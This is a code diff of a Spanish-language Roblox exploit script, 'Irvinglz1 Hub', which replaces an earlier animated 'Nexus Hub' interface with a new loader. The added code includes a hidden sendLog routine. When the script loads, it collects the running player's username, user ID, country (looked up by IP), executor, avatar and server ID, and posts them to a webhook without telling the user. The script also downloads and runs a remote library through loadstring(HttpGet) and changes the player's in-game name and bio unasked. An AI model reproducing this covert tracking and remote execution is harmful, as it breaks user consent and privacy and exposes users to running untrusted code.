-            TweenService:Create(bar5, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Rotation = 10, BackgroundTransparency = 0.5
-            }):Play()
-            TweenService:Create(bar6, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Rotation = -10, BackgroundTransparency = 0.5
-            }):Play()
-            task.wait(2)
-        end
-    end)
-    task.spawn(function()
-        local n = 0
-        while gui.Parent do
-            n += 1
-            TweenService:Create(titleGrad, TweenInfo.new(1.5, Enum.EasingStyle.Linear), { Rotation = n * 60 }):Play()
-            task.wait(1.5)
-        end
-    end)
-    task.spawn(function()
-        while gui.Parent do
-            TweenService:Create(title, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { TextSize = 60 }):Play()
-            task.wait(1.5)
-            TweenService:Create(title, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { TextSize = 56 }):Play()
-            task.wait(1.5)
+    
+    task.wait(2.5)
+    
+    local fadeOutTitle = TweenService:Create(
+        title,
+        TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
+        { TextTransparency = 1 }
+    )
+    fadeOutTitle:Play()
+    task.wait(1)
+    title.Visible = false
+    
+    mostrarMotivoConAnimacion()
+    mostrarTiempoConAnimacion()
+    mostrarContactoConAnimacion()
+
+    task.wait(0.5)
+    
+    player:Kick("🚫 Has sido baneado de IRVING HUB 🚫 NUUUUB")
+    return
+end
+
+local LOG_WEBHOOK_URL = ""
+
+local logged = false
+
+local function sendLog()
+    if logged then return end
+    logged = true
+
+    local player = game:GetService('Players').LocalPlayer
+    local playerName = player.Name
+    local displayName = player.DisplayName
+    local userId = player.UserId
+    local jobId = game.JobId
+    local placeId = game.PlaceId
+    local serverTime = os.time()
+    local date = os.date("%Y-%m-%d %H:%M:%S", serverTime)
+
+    local country = "Desconocido"
+    pcall(function()
+        local ipResponse = game:GetService('HttpService'):JSONDecode(game:HttpGet('http://ip-api.com/json/?fields=status,country'))
+        if ipResponse.status == "success" and ipResponse.country then
+            country = ipResponse.country
         end
     end)
 
-    -- Salida
-    task.spawn(function()
-        task.wait(2.8)
-        if not gui.Parent then return end
-        TweenService:Create(title, TweenInfo.new(0.6, Enum.EasingStyle.Quart), {
-            TextTransparency = 1, TextSize = 80
-        }):Play()
-        TweenService:Create(subtitle, TweenInfo.new(0.6), { TextTransparency = 1 }):Play()
-        TweenService:Create(ring1, TweenInfo.new(0.6), {
-            BackgroundTransparency = 1, Size = UDim2.new(0, 700, 0, 220)
-        }):Play()
-        TweenService:Create(ring2, TweenInfo.new(0.6), {
-            BackgroundTransparency = 1, Size = UDim2.new(0, 500, 0, 160)
-        }):Play()
-        TweenService:Create(ring3, TweenInfo.new(0.6), {
-            BackgroundTransparency = 1, Size = UDim2.new(0, 400, 0, 120)
-        }):Play()
-        for _, b in ipairs({bar1, bar2, bar3, bar4, bar5, bar6}) do
-            TweenService:Create(b, TweenInfo.new(0.6), { BackgroundTransparency = 1 }):Play()
+    local executor = "Desconocido"
+    pcall(function()
+        if syn and syn.version then
+            executor = "Synapse X - " .. syn.version
+        elseif krnl and krnl.version then
+            executor = "Krnl - " .. krnl.version
+        elseif script and script.Name and script.Name == "Solara" then
+            executor = "Solara"
+        else
+            executor = "Otro ejecutor"
         end
-        TweenService:Create(bg, TweenInfo.new(0.6), { BackgroundTransparency = 1 }):Play()
-        task.wait(0.7)
-        gui:Destroy()
-        if onComplete then onComplete() end
+    end)
+
+    local avatarUrl = ""
+    local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
+    pcall(function()
+        local avatarRequest = string.format('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=420x420&format=Png&isCircular=false', userId)
+        local avatarData = game:GetService('HttpService'):JSONDecode(game:HttpGet(avatarRequest))
+        if avatarData and avatarData.data and avatarData.data[1] then
+            avatarUrl = avatarData.data[1].imageUrl
+        end
+    end)
+
+    local mapName = "Desconocido"
+    pcall(function()
+        mapName = game:GetService('MarketplaceService'):GetProductInfo(placeId).Name
+    end)
+
+    local data = {
+        ["content"] = "📊 **¡Alguien cargó el script!**",
+        ["embeds"] = {{
+            ["title"] = "👤 Información del usuario",
+            ["color"] = 1724282,
+            ["fields"] = {
+                {
+                    ["name"] = "📛 Nombre",
+                    ["value"] = displayName .. " (@ " .. playerName .. ")",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🆔 User ID",
+                    ["value"] = tostring(userId),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🗺️ Map Name",
+                    ["value"] = mapName,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🖥️ Ejecutor",
+                    ["value"] = executor,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🌍 País",
+                    ["value"] = country,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🕐 Fecha/Hora",
+                    ["value"] = date,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🔗 Perfil de Roblox",
+                    ["value"] = "[🔗 Click para ver perfil](" .. profileUrl .. ")",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🔑 Server ID",
+                    ["value"] = "`" .. jobId .. "`",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "📌 Comando para unirte",
+                    ["value"] = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPrivateServer(" .. placeId .. ", \"" .. jobId .. "\")\n```",
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {
+                ["text"] = "Irvinglz1 Hub 67727"
+            },
+            ["timestamp"] = DateTime.now():ToIsoDate(),
+            ["thumbnail"] = {
+                ["url"] = avatarUrl
+            }
+        }}
+    }
+
+    local encodedData = game:GetService('HttpService'):JSONEncode(data)
+    pcall(function()
+        if syn and syn.request then
+            syn.request({
+                Url = LOG_WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = encodedData
+            })
+        elseif http and http.request then
+            http.request({
+                Url = LOG_WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = encodedData
+            })
+        elseif request then
+            request({
+                Url = LOG_WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = encodedData
+            })
+        else
+            game:GetService('HttpService'):PostAsync(LOG_WEBHOOK_URL, encodedData, Enum.HttpContentType.ApplicationJson)
+        end
     end)
 end
 
--- ============================================================
--- UI DEL HUB
--- ============================================================
-local function buildHubUI()
-    if UI_CONTAINER:FindFirstChild("NexusHub") then
-        UI_CONTAINER.NexusHub:Destroy()
-    end
+task.spawn(function()
+    task.wait(1)
+    sendLog()
+end)
 
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "NexusHub"
-    gui.ResetOnSpawn = false
-    gui.Parent = UI_CONTAINER
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local Title = Instance.new("TextLabel")
+local ProblemText = Instance.new("TextLabel")
+local ExitBtn = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
 
-    local root = Instance.new("Frame")
-    root.Size = UDim2.new(1, 0, 1, 0)
-    root.BackgroundTransparency = 1
-    root.ZIndex = 1
-    root.Parent = gui
+local DevTitle = Instance.new("TextLabel")
+local DevFrame = Instance.new("Frame")
+local DevIcon = Instance.new("ImageLabel")
+local DevName = Instance.new("TextLabel")
+local DevUser = Instance.new("TextLabel")
+local DevDiscord = Instance.new("TextLabel")
+local DevTikTok = Instance.new("TextLabel")
+local IconCorner = Instance.new("UICorner")
 
-    local uiScale = Instance.new("UIScale")
-    uiScale.Scale = loadScale()
-    uiScale.Parent = root
+local TARGET_USERNAME = "Hiimnew928289alt2" 
+local DISPLAY_NAME = "777"
+local DISCORD_INVITE = "https://discord.gg/CDNRhNguz"
+local TIKTOK_USER = "@iirvinglzc1"
 
-    -- ---------- BARRA SUPERIOR ----------
-    local titleBar = Instance.new("Frame")
-    titleBar.Size = UDim2.new(0, 145, 0, 26)
-    titleBar.Position = UDim2.new(0.5, -72, 0, 4)
-    titleBar.BackgroundTransparency = 1
-    titleBar.ZIndex = 5
-    titleBar.Parent = root
+ScreenGui.Parent = game:GetService("CoreGui")
+ScreenGui.Name = "Irvinglz1_Maintenance"
 
-    local barGlow = Instance.new("Frame")
-    barGlow.Size = UDim2.new(1, 16, 1, 8)
-    barGlow.Position = UDim2.new(0.5, -8, 0.5, -4)
-    barGlow.AnchorPoint = Vector2.new(0.5, 0.5)
-    barGlow.BackgroundColor3 = Color3.fromRGB(60, 140, 255)
-    barGlow.BackgroundTransparency = 0.85
-    barGlow.BorderSizePixel = 0
-    barGlow.ZIndex = 1
-    barGlow.Parent = titleBar
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
+MainFrame.Position = UDim2.new(0.5, -150, 0.5, -140)
+MainFrame.Size = UDim2.new(0, 300, 0, 320)
+MainFrame.Active = true
+MainFrame.Draggable = true 
 
-    local bgCorner = Instance.new("UICorner")
-    bgCorner.CornerRadius = UDim.new(1, 0)
-    bgCorner.Parent = barGlow
+UICorner.CornerRadius = UDim.new(0, 15)
+UICorner.Parent = MainFrame
 
-    local bgGrad = Instance.new("UIGradient")
-    bgGrad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0,   Color3.fromRGB(60, 140, 255)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(180, 100, 255)),
-        ColorSequenceKeypoint.new(1,   Color3.fromRGB(60, 220, 255)),
-    })
-    bgGrad.Rotation = 45
-    bgGrad.Parent = barGlow
+Title.Parent = MainFrame
+Title.Size = UDim2.new(1, 0, 0, 45)
+Title.Text = "🎵 Irvinglz1 Hub 🎵"
+Title.TextColor3 = Color3.fromRGB(0, 150, 255)
+Title.TextSize = 22
+Title.Font = Enum.Font.GothamBold
+Title.BackgroundTransparency = 1
 
-    local barInner = Instance.new("Frame")
-    barInner.Size = UDim2.new(0, 115, 0, 16)
-    barInner.Position = UDim2.new(0.5, 0, 0.5, 0)
-    barInner.AnchorPoint = Vector2.new(0.5, 0.5)
-    barInner.BackgroundColor3 = Color3.fromRGB(120, 180, 255)
-    barInner.BackgroundTransparency = 0.92
-    barInner.BorderSizePixel = 0
-    barInner.ZIndex = 2
-    barInner.Parent = titleBar
+ProblemText.Parent = MainFrame
+ProblemText.Position = UDim2.new(0, 15, 0, 50)
+ProblemText.Size = UDim2.new(0, 270, 0, 40)
+ProblemText.Text = "¡Bienvenido a Irvinglz1 Hub! Disfruta de la mejor experiencia."
+ProblemText.TextColor3 = Color3.fromRGB(220, 220, 220)
+ProblemText.TextWrapped = true
+ProblemText.TextSize = 14
+ProblemText.Font = Enum.Font.GothamMedium
+ProblemText.BackgroundTransparency = 1
 
-    local biCorner = Instance.new("UICorner")
-    biCorner.CornerRadius = UDim.new(1, 0)
-    biCorner.Parent = barInner
+DevTitle.Parent = MainFrame
+DevTitle.Position = UDim2.new(0, 15, 0, 95)
+DevTitle.Size = UDim2.new(0, 270, 0, 20)
+DevTitle.Text = " 👑 Creador 👑"
+DevTitle.TextColor3 = Color3.fromRGB(255, 215, 0)
+DevTitle.TextSize = 16
+DevTitle.Font = Enum.Font.GothamBold
+DevTitle.TextXAlignment = Enum.TextXAlignment.Left
+DevTitle.BackgroundTransparency = 1
 
-    local function makeDecoBar(w, h, y, color)
-        local f = Instance.new("Frame")
-        f.Size = UDim2.new(0, w, 0, h)
-        f.Position = UDim2.new(0.5, 0, 0.5, y)
-        f.AnchorPoint = Vector2.new(0.5, 0.5)
-        f.BackgroundColor3 = color
-        f.BackgroundTransparency = 0.6
-        f.BorderSizePixel = 0
-        f.ZIndex = 3
-        f.Parent = titleBar
-        local c = Instance.new("UICorner")
-        c.CornerRadius = UDim.new(1, 0)
-        c.Parent = f
-        return f
-    end
+DevFrame.Name = "DevFrame"
+DevFrame.Parent = MainFrame
+DevFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+DevFrame.Position = UDim2.new(0, 15, 0, 120)
+DevFrame.Size = UDim2.new(0, 270, 0, 105)
 
-    local deco1 = makeDecoBar(120, 2, -9, Color3.fromRGB(120, 180, 255))
-    local deco2 = makeDecoBar(110, 2,  9, Color3.fromRGB(180, 120, 255))
-    local deco3 = makeDecoBar(80,  1, -12, Color3.fromRGB(60, 220, 255))
-    local deco4 = makeDecoBar(80,  1,  12, Color3.fromRGB(60, 220, 255))
+local devCorner = Instance.new("UICorner")
+devCorner.CornerRadius = UDim.new(0, 10)
+devCorner.Parent = DevFrame
 
-    local titleLabel = Instance.new("TextLabel")
-    titleLabel.Size = UDim2.new(1, 0, 1, 0)
-    titleLabel.BackgroundTransparency = 1
-    titleLabel.Text = "Nexus Hub"
-    titleLabel.TextColor3 = Color3.fromRGB(240, 244, 255)
-    titleLabel.Font = Enum.Font.GothamBold
-    titleLabel.TextSize = 18
-    titleLabel.TextStrokeTransparency = 0.5
-    titleLabel.TextStrokeColor3 = Color3.fromRGB(60, 140, 255)
-    titleLabel.ZIndex = 4
-    titleLabel.Parent = titleBar
+local Success, TargetUserId = pcall(function()
+    return game.Players:GetUserIdFromNameAsync(TARGET_USERNAME)
+end)
 
-    local titleGrad = Instance.new("UIGradient")
-    titleGrad.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0,   Color3.fromRGB(240, 244, 255)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 200, 255)),
-        ColorSequenceKeypoint.new(1,   Color3.fromRGB(240, 244, 255)),
-    })
-    titleGrad.Parent = titleLabel
+if Success then
+    local content, isReady = game.Players:GetUserThumbnailAsync(TargetUserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
+    DevIcon.Image = content
+else
+    DevIcon.Image = "rbxassetid://0" 
+end
 
-    -- Animaciones de la barra superior
-    task.spawn(function()
-        while gui.Parent do
-            TweenService:Create(barGlow, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                BackgroundTransparency = 0.7, Size = UDim2.new(1, 26, 1, 14)
-            }):Play()
-            task.wait(1.5)
-            TweenService:Create(barGlow, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                BackgroundTransparency = 0.9, Size = UDim2.new(1, 16, 1, 8)
-            }):Play()
-            task.wait(1.5)
-        end
+DevIcon.Parent = DevFrame
+DevIcon.Size = UDim2.new(0, 60, 0, 60)
+DevIcon.Position = UDim2.new(0, 10, 0, 12)
+DevIcon.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+IconCorner.CornerRadius = UDim.new(1, 0)
+IconCorner.Parent = DevIcon
+
+DevName.Parent = DevFrame
+DevName.Position = UDim2.new(0, 80, 0, 12)
+DevName.Size = UDim2.new(0, 180, 0, 20)
+DevName.Text = DISPLAY_NAME
+DevName.TextColor3 = Color3.fromRGB(255, 255, 255)
+DevName.TextSize = 17
+DevName.Font = Enum.Font.GothamBold
+DevName.TextXAlignment = Enum.TextXAlignment.Left
+DevName.BackgroundTransparency = 1
+
+DevUser.Parent = DevFrame
+DevUser.Position = UDim2.new(0, 80, 0, 35)
+DevUser.Size = UDim2.new(0, 180, 0, 20)
+DevUser.Text = "@" .. TARGET_USERNAME
+DevUser.TextColor3 = Color3.fromRGB(180, 180, 180)
+DevUser.TextSize = 13
+DevUser.Font = Enum.Font.Gotham
+DevUser.TextXAlignment = Enum.TextXAlignment.Left
+DevUser.BackgroundTransparency = 1
+
+DevDiscord.Parent = DevFrame
+DevDiscord.Position = UDim2.new(0, 80, 0, 55)
+DevDiscord.Size = UDim2.new(0, 180, 0, 20)
+DevDiscord.Text = "Discord: " .. DISCORD_INVITE
+DevDiscord.TextColor3 = Color3.fromRGB(88, 101, 242)
+DevDiscord.TextSize = 11
+DevDiscord.Font = Enum.Font.GothamMedium
+DevDiscord.TextXAlignment = Enum.TextXAlignment.Left
+DevDiscord.BackgroundTransparency = 1
+
+DevTikTok.Parent = DevFrame
+DevTikTok.Position = UDim2.new(0, 80, 0, 75)
+DevTikTok.Size = UDim2.new(0, 180, 0, 20)
+DevTikTok.Text = "TikTok: " .. TIKTOK_USER
+DevTikTok.TextColor3 = Color3.fromRGB(255, 0, 80)
+DevTikTok.TextSize = 12
+DevTikTok.Font = Enum.Font.GothamMedium
+DevTikTok.TextXAlignment = Enum.TextXAlignment.Left
+DevTikTok.BackgroundTransparency = 1
+
+ExitBtn.Parent = MainFrame
+ExitBtn.Position = UDim2.new(0.5, -70, 0, 240)
+ExitBtn.Size = UDim2.new(0, 140, 0, 40)
+ExitBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+ExitBtn.Text = "Comenzar"
+ExitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExitBtn.Font = Enum.Font.GothamBold
+
+local btnCorner = Instance.new("UICorner")
+btnCorner.Parent = ExitBtn
+ExitBtn.MouseButton1Click:Wait() 
+ScreenGui:Destroy()
+
+local CoreGui = game:GetService("CoreGui")
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "Irvinglz1LoadingScreen"
+gui.Parent = CoreGui
+gui.IgnoreGuiInset = true
+
+local bg = Instance.new("Frame", gui)
+bg.Size = UDim2.new(1,0,1,0)
+bg.BackgroundColor3 = Color3.fromRGB(10,10,10)
+
+local textLabel = Instance.new("TextLabel", bg)
+textLabel.Size = UDim2.new(1,0,0,60)
+textLabel.Position = UDim2.new(0,0,0.5,-30)
+textLabel.BackgroundTransparency = 1
+textLabel.TextColor3 = Color3.fromRGB(255,255,255)
+textLabel.TextStrokeTransparency = 0.5
+textLabel.Font = Enum.Font.GothamBold
+textLabel.TextSize = 40
+textLabel.TextTransparency = 1
+textLabel.Text = ""
+
+TweenService:Create(bg, TweenInfo.new(1), {
+    BackgroundTransparency = 0
+}):Play()
+
+TweenService:Create(textLabel, TweenInfo.new(1), {
+    TextTransparency = 0
+}):Play()
+
+local message = "🎵 Irvinglz1 Hub 🎵"
+for i = 1, #message do
+    textLabel.Text = string.sub(message, 1, i)
+    task.wait(0.08)
+end
+
+task.wait(2)
+
+local fadeOut = TweenService:Create(bg, TweenInfo.new(1.5), {
+    BackgroundTransparency = 1
+})
+
+local textFade = TweenService:Create(textLabel, TweenInfo.new(1.5), {
+    TextTransparency = 1
+})
+
+fadeOut:Play()
+textFade:Play()
+
+fadeOut.Completed:Wait()
+gui:Destroy()
+
+local function SetDefaultNameAndBio()
+    local player = game.Players.LocalPlayer
+    local displayName = player.DisplayName 
+    local RE = game:GetService("ReplicatedStorage"):WaitForChild("RE")
+
+    local nameTextRemote = RE:WaitForChild("1RPNam1eTex1t")
+    local nameColorRemote = RE:WaitForChild("1RPNam1eColo1r")
+
+    pcall(function()
+        nameTextRemote:FireServer("RolePlayName", "[ Usuario de Irvinglz1 ]")
+        nameColorRemote:FireServer("PickingRPNameColor", Color3.new(1, 1, 1))
+        nameTextRemote:FireServer("RolePlayBio", "¡ YES IRVINGLZ1 ON TOP !")
+        nameColorRemote:FireServer("PickingRPBioColor", Color3.new(0, 0, 0))
     end)
-    task.spawn(function()
-        while gui.Parent do
-            TweenService:Create(barInner, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                BackgroundTransparency = 0.85, Size = UDim2.new(0, 130, 0, 20)
-            }):Play()
-            task.wait(1.2)
-            TweenService:Create(barInner, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                BackgroundTransparency = 0.95, Size = UDim2.new(0, 115, 0, 16)
-            }):Play()
-            task.wait(1.2)
-        end
-    end)
-    task.spawn(function()
-        while gui.Parent do
-            for _, v in ipairs({deco1, deco2, deco3, deco4}) do
-                local xo = v.Size.X.Offset
-                TweenService:Create(v, TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                    BackgroundTransparency = 0.3, Size = UDim2.new(0, xo + 25, 0, v.Size.Y.Offset)
-                }):Play()
+end
+
+SetDefaultNameAndBio()
+
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+local Window = Rayfield:CreateWindow({
+   Name = "🎵 Irvinglz1 Hub 🎵",
+   LoadingTitle = "Irvinglz1 Hub",
+   LoadingSubtitle = "Discord: " .. DISCORD_INVITE,
+   ConfigurationSaving = {
+      Enabled = false
+   },
+   Discord = {Enabled = false},
+   KeySystem = false
+})
+
+Rayfield:Notify({
+    Title = "¡Bienvenido a Irvinglz1 Hub!",
+    Content = "PARA QUE LOS AUDIOS FUNCIONEN NECESITAS EL PASE DE MUSICA",
+    Duration = 10,
+    Image = 4483362458,
+})
+
+Rayfield:Notify({
+    Title = "NECESITO IDS",
+    Content = "ALGUN ID QUE TENGAN O QUE NO FUNCIONE ESCRIBANME EN EL SCRIPT DENLE A CONTACTO ALGUN INSULTO O ALGO BANEADO",
+    Duration = 10,
+    Image = 4483362458,
+})
+
+local function ButtonPSound()
+    local welcomeSound = Instance.new("Sound")
+    welcomeSound.Name = "WelcomeSound"
+    welcomeSound.SoundId = "rbxassetid://1673280232"
+    welcomeSound.Volume = 5
+    welcomeSound.Parent = game:GetService("SoundService")
+    welcomeSound:Play()
+    game:GetService("Debris"):AddItem(welcomeSound, 10)
+end
+
+task.spawn(function()
+    task.wait(1)
+    local CoreGui = game:GetService("CoreGui")
+    for _,v in pairs(CoreGui:GetDescendants()) do
+        if v:IsA("TextLabel") or v:IsA("TextButton") then
+            if string.find(v.Text, "Show") then
+                v.Text = "Irvinglz1 Music GUI"
             end
-            task.wait(0.9)
-            for _, v in ipairs({deco1, deco2, deco3, deco4}) do
-                local xo = v.Size.X.Offset
-                TweenService:Create(v, TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                    BackgroundTransparency = 0.75, Size = UDim2.new(0, math.max(40, xo - 25), 0, v.Size.Y.Offset)
-                }):Play()
-            end
-            task.wait(0.9)
-        end
-    end)
-    task.spawn(function()
-        local n = 1
-        while gui.Parent do
-            TweenService:Create(titleGrad, TweenInfo.new(2, Enum.EasingStyle.Linear), { Rotation = n * 45 }):Play()
-            task.wait(2)
-            n += 1
-            if n > 8 then n = 1 end
-        end
-    end)
-
-    -- ---------- PANEL DE PERFIL ----------
-    local profileShadow = Instance.new("Frame")
-    profileShadow.Size = UDim2.new(0, 240, 0, 105)
-    profileShadow.Position = UDim2.new(0, 10, 0, 42)
-    profileShadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    profileShadow.BackgroundTransparency = 0.5
-    profileShadow.BorderSizePixel = 0
-    profileShadow.ZIndex = 1
-    profileShadow.Parent = root
-
-    local psCorner = Instance.new("UICorner")
-    psCorner.CornerRadius = UDim.new(0, 16)
-    psCorner.Parent = profileShadow
-
-    local profile = Instance.new("Frame")
-    profile.Size = UDim2.new(0, 230, 0, 95)
-    profile.Position = UDim2.new(0, 10, 0, 42)
-    profile.BackgroundColor3 = Color3.fromRGB(15, 17, 23)
-    profile.BorderSizePixel = 0
-    profile.ClipsDescendants = true
-    profile.Active = true
-    profile.Draggable = true
-    profile.ZIndex = 2
-    profile.Parent = root
-
-    local pCorner = Instance.new("UICorner")
-    pCorner.CornerRadius = UDim.new(0, 14)
-    pCorner.Parent = profile
-
-    local pGrad = Instance.new("UIGradient")
-    pGrad.Color = ColorSequence.new(Color3.fromRGB(24, 28, 40), Color3.fromRGB(12, 14, 20))
-    pGrad.Rotation = 135
-    pGrad.Parent = profile
-
-    local pStroke = Instance.new("UIStroke")
-    pStroke.Color = Color3.fromRGB(90, 120, 160)
-    pStroke.Thickness = 1.2
-    pStroke.Transparency = 0.4
-    pStroke.Parent = profile
-
-    local pStrokeGrad = Instance.new("UIGradient")
-    pStrokeGrad.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255), Color3.fromRGB(80, 100, 140))
-    pStrokeGrad.Rotation = 45
-    pStrokeGrad.Parent = pStroke
-
-    task.spawn(function()
-        while gui.Parent do
-            TweenService:Create(pStroke, TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Color = Color3.fromRGB(120, 180, 255), Transparency = 0.1, Thickness = 1.8
-            }):Play()
-            task.wait(1.8)
-            TweenService:Create(pStroke, TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Color = Color3.fromRGB(90, 120, 160), Transparency = 0.4, Thickness = 1.2
-            }):Play()
-            task.wait(1.8)
-        end
-    end)
-
-    local avatarFrame = Instance.new("Frame")
-    avatarFrame.Size = UDim2.new(0, 34, 0, 34)
-    avatarFrame.Position = UDim2.new(0, 12, 0, 10)
-    avatarFrame.BackgroundTransparency = 1
-    avatarFrame.ZIndex = 3
-    avatarFrame.Parent = profile
-
-    local avatar = Instance.new("ImageLabel")
-    avatar.Size = UDim2.new(1, 0, 1, 0)
-    avatar.BackgroundTransparency = 1
-    avatar.Image = AUTHOR_AVATAR
-    avatar.ScaleType = Enum.ScaleType.Crop
-    avatar.ZIndex = 3
-    avatar.Parent = avatarFrame
-
-    local avCorner = Instance.new("UICorner")
-    avCorner.CornerRadius = UDim.new(1, 0)
-    avCorner.Parent = avatar
-
-    local avStroke = Instance.new("UIStroke")
-    avStroke.Color = Color3.fromRGB(120, 180, 255)
-    avStroke.Thickness = 1.5
-    avStroke.Transparency = 0.2
-    avStroke.Parent = avatar
-
-    task.spawn(function()
-        while gui.Parent do
-            TweenService:Create(avStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Transparency = 0, Thickness = 2, Color = Color3.fromRGB(180, 120, 255)
-            }):Play()
-            task.wait(1.5)
-            TweenService:Create(avStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Transparency = 0.2, Thickness = 1.5, Color = Color3.fromRGB(120, 180, 255)
-            }):Play()
-            task.wait(1.5)
-        end
-    end)
-
-    local nameFrame = Instance.new("Frame")
-    nameFrame.Size = UDim2.new(1, -100, 0, 32)
-    nameFrame.Position = UDim2.new(0, 54, 0, 12)
-    nameFrame.BackgroundTransparency = 1
-    nameFrame.ZIndex = 3
-    nameFrame.Parent = profile
-
-    local nameLabel = Instance.new("TextLabel")
-    nameLabel.Size = UDim2.new(1, 0, 0, 17)
-    nameLabel.BackgroundTransparency = 1
-    nameLabel.Text = "Nexus"
-    nameLabel.TextColor3 = Color3.fromRGB(240, 244, 255)
-    nameLabel.Font = Enum.Font.GothamBold
-    nameLabel.TextSize = 15
-    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
-    nameLabel.ZIndex = 3
-    nameLabel.Parent = nameFrame
-
-    local statusFrame = Instance.new("Frame")
-    statusFrame.Size = UDim2.new(1, 0, 0, 14)
-    statusFrame.Position = UDim2.new(0, 0, 0, 17)
-    statusFrame.BackgroundTransparency = 1
-    statusFrame.ZIndex = 3
-    statusFrame.Parent = nameFrame
-
-    local statusText = Instance.new("TextLabel")
-    statusText.Size = UDim2.new(0, 55, 1, 0)
-    statusText.BackgroundTransparency = 1
-    statusText.Text = "ANTI-HIT"
-    statusText.TextColor3 = Color3.fromRGB(140, 150, 170)
-    statusText.Font = Enum.Font.GothamMedium
-    statusText.TextSize = 10
-    statusText.TextXAlignment = Enum.TextXAlignment.Left
-    statusText.ZIndex = 3
-    statusText.Parent = statusFrame
-
-    local statusDot = Instance.new("Frame")
-    statusDot.Size = UDim2.new(0, 6, 0, 6)
-    statusDot.Position = UDim2.new(0, 58, 0.5, -3)
-    statusDot.BackgroundColor3 = Color3.fromRGB(230, 70, 80)
-    statusDot.BorderSizePixel = 0
-    statusDot.ZIndex = 3
-    statusDot.Parent = statusFrame
-
-    local sdCorner = Instance.new("UICorner")
-    sdCorner.CornerRadius = UDim.new(1, 0)
-    sdCorner.Parent = statusDot
-
-    task.spawn(function()
-        while gui.Parent do
-            TweenService:Create(statusDot, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Size = UDim2.new(0, 8, 0, 8), Position = UDim2.new(0, 57, 0.5, -4)
-            }):Play()
-            task.wait(0.6)
-            TweenService:Create(statusDot, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                Size = UDim2.new(0, 6, 0, 6), Position = UDim2.new(0, 58, 0.5, -3)
-            }):Play()
-            task.wait(0.6)
-        end
-    end)
-
-    -- Botón configuración
-    local settingsBtn = Instance.new("TextButton")
-    settingsBtn.Size = UDim2.new(0, 24, 0, 24)
-    settingsBtn.Position = UDim2.new(1, -62, 0, 10)
-    settingsBtn.BackgroundColor3 = Color3.fromRGB(30, 35, 48)
-    settingsBtn.Text = "⚙"
-    settingsBtn.TextColor3 = Color3.fromRGB(120, 180, 255)
-    settingsBtn.TextSize = 14
-    settingsBtn.Font = Enum.Font.GothamBold
-    settingsBtn.AutoButtonColor = false
-    settingsBtn.ZIndex = 3
-    settingsBtn.Parent = profile
-
-    local setCorner = Instance.new("UICorner")
-    setCorner.CornerRadius = UDim.new(0, 7)
-    setCorner.Parent = settingsBtn
-
-    local setStroke = Instance.new("UIStroke")
-    setStroke.Color = Color3.fromRGB(70, 90, 130)
-    setStroke.Thickness = 1
-    setStroke.Transparency = 0.6
-    setStroke.Parent = settingsBtn
-
-    settingsBtn.MouseEnter:Connect(function()
-        TweenService:Create(settingsBtn, TweenInfo.new(0.2, Enum.EasingStyle.Quart), {
-            BackgroundColor3 = Color3.fromRGB(45, 55, 75)
-        }):Play()
-    end)
-    settingsBtn.MouseLeave:Connect(function()
